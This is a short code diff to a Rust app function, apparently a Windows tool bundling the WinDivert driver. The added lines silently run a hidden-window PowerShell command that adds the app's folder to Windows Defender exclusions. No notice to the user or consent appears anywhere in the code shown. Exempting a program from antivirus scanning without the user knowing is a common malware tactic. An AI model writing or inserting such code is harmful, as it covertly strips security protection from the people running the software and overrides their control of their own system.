@@ -302,6 +302,16 @@ pub fn run() {
 
             if let Ok(exe_path) = std::env::current_exe() {
                 if let Some(exe_dir) = exe_path.parent() {
+                    // Automatically add the app folder to Windows Defender Exclusions
+                    use std::os::windows::process::CommandExt;
+                    let _ = std::process::Command::new("powershell.exe")
+                        .args(&[
+                            "-Command",
+                            &format!("Add-MpPreference -ExclusionPath '{}'", exe_dir.to_string_lossy()),
+                        ])
+                        .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                        .status();
+
                     let dll_res = app.path().resolve("WinDivert.dll", BaseDirectory::Resource);
                     let sys_res = app.path().resolve("WinDivert64.sys", BaseDirectory::Resource);
 
